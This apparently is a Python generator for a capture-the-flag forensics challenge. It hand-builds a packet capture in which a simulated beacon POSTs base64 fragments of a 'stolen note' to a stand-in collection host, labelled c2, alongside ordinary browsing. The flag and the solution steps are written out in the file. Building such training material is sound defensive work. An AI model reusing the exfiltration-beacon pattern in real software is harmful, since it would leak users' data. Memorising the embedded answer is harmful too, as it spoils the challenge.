#!/usr/bin/env python3
"""Generate ``capture.pcap`` for the http-body-exfil challenge.

A libpcap capture (linktype EN10MB) written with a small hand-rolled writer —
no scapy required. It contains benign HTTP GET browsing plus an exfiltration
channel: a beacon repeatedly POSTs to ``http://cdn-metrics.example/collect``.
Each POST body is a base64 fragment of a stolen note and carries an
``X-Seq: <n>`` header. The POSTs are emitted out of order on the wire. Sort by
``X-Seq``, concatenate the bodies, base64-decode -> the note -> the flag.
"""
import random
import struct

FLAG = "NCTF{ch4nk3d_p0st_b0dy_r34ss3mbl3d}"
STOLEN_NOTE = (
    "CONFIDENTIAL customer export\n" "account: 4417-**\n" f"exfil-token: {FLAG}\n"
).encode()

random.seed(1337)


def ip_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(f">{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def tcp_segment(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    seq: int,
    ack: int,
    payload: bytes,
) -> bytes:
    def ip2b(ip: str) -> bytes:
        return bytes(int(o) for o in ip.split("."))

    tcp_hdr_no_csum = struct.pack(
        ">HHIIBBHHH",
        src_port,
        dst_port,
        seq,
        ack,
        (5 << 4),  # data offset 5 words, no options
        0x18,  # PSH+ACK
        65535,
        0,  # checksum placeholder
        0,  # urgent pointer
    )
    pseudo = (
        ip2b(src_ip)
        + ip2b(dst_ip)
        + struct.pack(">BBH", 0, 6, len(tcp_hdr_no_csum) + len(payload))
    )
    csum = ip_checksum(pseudo + tcp_hdr_no_csum + payload)
    tcp_hdr = tcp_hdr_no_csum[:16] + struct.pack(">H", csum) + tcp_hdr_no_csum[18:]
    tcp = tcp_hdr + payload

    total_len = 20 + len(tcp)
    ip_hdr_no_csum = (
        struct.pack(
            ">BBHHHBBH",
            0x45,
            0,
            total_len,
            random.randint(0, 0xFFFF),
            0x4000,  # don't fragment
            64,
            6,  # TCP
            0,
        )
        + ip2b(src_ip)
        + ip2b(dst_ip)
    )
    ip_csum = ip_checksum(ip_hdr_no_csum)
    ip_hdr = ip_hdr_no_csum[:10] + struct.pack(">H", ip_csum) + ip_hdr_no_csum[12:]

    eth = b"\x52\x54\x00\x11\x22\x33" + b"\x52\x54\x00\xaa\xbb\xcc" + b"\x08\x00"
    return eth + ip_hdr + tcp


class PcapWriter:
    def __init__(self, path: str):
        self.fh = open(path, "wb")
        self.fh.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        self.ts = 1_710_150_000

    def write(self, frame: bytes):
        self.ts += random.randint(1, 3)
        usec = random.randint(0, 999999)
        self.fh.write(struct.pack("<IIII", self.ts, usec, len(frame), len(frame)))
        self.fh.write(frame)

    def close(self):
        self.fh.close()


def http_get(host: str, path: str) -> bytes:
    return (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
    ).encode()


def http_post(seq_no: int, body: bytes) -> bytes:
    return (
        f"POST /collect HTTP/1.1\r\nHost: cdn-metrics.example\r\n"
        f"User-Agent: metrics-agent/1.0\r\nX-Seq: {seq_no}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body


def main() -> None:
    import base64

    b64 = base64.b64encode(STOLEN_NOTE).decode()
    chunk = 11
    fragments = [b64[i : i + chunk] for i in range(0, len(b64), chunk)]

    victim = "10.10.5.23"
    c2 = "198.51.100.77"

    frames = []

    # benign browsing (noise)
    benign_hosts = [
        ("93.184.216.34", "www.example.com", "/index.html"),
        ("151.101.1.69", "cdn.jsdelivr.net", "/npm/jquery.min.js"),
        ("140.82.121.4", "github.com", "/status"),
    ]
    sport = 49000
    for ip, host, path in benign_hosts:
        frames.append(tcp_segment(victim, ip, sport, 80, 1000, 1, http_get(host, path)))
        sport += 1

    # exfil POSTs, one per fragment, shuffled on the wire
    exfil = list(enumerate(fragments))
    random.shuffle(exfil)
    seqn = 5000
    for n, frag in exfil:
        frames.append(
            tcp_segment(victim, c2, sport, 80, seqn, 1, http_post(n, frag.encode()))
        )
        seqn += 2000
        sport += 1

    # a decoy POST to a different endpoint with junk (not the channel)
    frames.append(
        tcp_segment(
            victim,
            "203.0.113.9",
            sport,
            80,
            7000,
            1,
            (
                b"POST /upload HTTP/1.1\r\nHost: paste.example\r\n"
                b"Content-Length: 5\r\n\r\nhello"
            ),
        )
    )

    # more benign browsing
    frames.append(
        tcp_segment(
            victim,
            "93.184.216.34",
            sport + 1,
            80,
            1500,
            1,
            http_get("www.example.com", "/favicon.ico"),
        )
    )

    random.shuffle(frames)

    w = PcapWriter("capture.pcap")
    for f in frames:
        w.write(f)
    w.close()

    import os

    print(
        f"wrote capture.pcap ({os.path.getsize('capture.pcap')} bytes), "
        f"{len(fragments)} exfil chunks, flag={FLAG}"
    )


if __name__ == "__main__":
    main()
